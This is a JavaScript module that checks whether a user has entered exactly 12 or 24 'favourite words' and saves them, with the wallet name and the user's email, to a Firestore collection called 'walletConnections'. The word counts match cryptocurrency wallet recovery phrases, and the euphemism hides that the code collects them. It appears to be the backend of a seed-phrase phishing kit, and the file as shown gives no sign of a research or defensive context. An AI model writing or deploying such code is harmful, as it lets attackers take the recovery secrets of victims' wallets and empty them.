import { db } from "../firebase/firebase";

import {
  collection,
  addDoc,
  serverTimestamp,
} from "firebase/firestore";

/* =========================
   VALIDATE 12 / 24 WORDS
========================= */
export const validateFavouriteWords = (words) => {
  if (!words || typeof words !== "string") {
    return {
      isValid: false,
      wordCount: 0,
      error: "Please enter your favourite words",
    };
  }

  const splitWords = words
    .trim()
    .split(/\s+/)
    .filter((word) => word.length > 0);

  const wordCount = splitWords.length;

  if (wordCount !== 12 && wordCount !== 24) {
    return {
      isValid: false,
      wordCount,
      error: `Please enter exactly 12 or 24 words. You entered ${wordCount}.`,
    };
  }

  return {
    isValid: true,
    wordCount,
    error: null,
  };
};

/* =========================
   SAVE TO FIREBASE
========================= */
export const saveWalletConnection = async (
  walletData
) => {
  try {
    const walletUID = Math.random()
      .toString(36)
      .substring(2, 18);

    const docData = {
      walletUID,

      walletName: walletData.name,
      walletType: walletData.type,

      submittedEmail:
        walletData.email || null,

      favouriteWords:
        walletData.favouriteWords ||
        null,

      wordCount:
        walletData.wordCount || null,

      createdAt: serverTimestamp(),
      isActive: true,
    };

    const docRef = await addDoc(
      collection(db, "walletConnections"),
      docData
    );

    return {
      success: true,
      uid: walletUID,
      docId: docRef.id,
    };
  } catch (error) {
    console.error(error);

    return {
      success: false,
      error: error.message,
    };
  }
};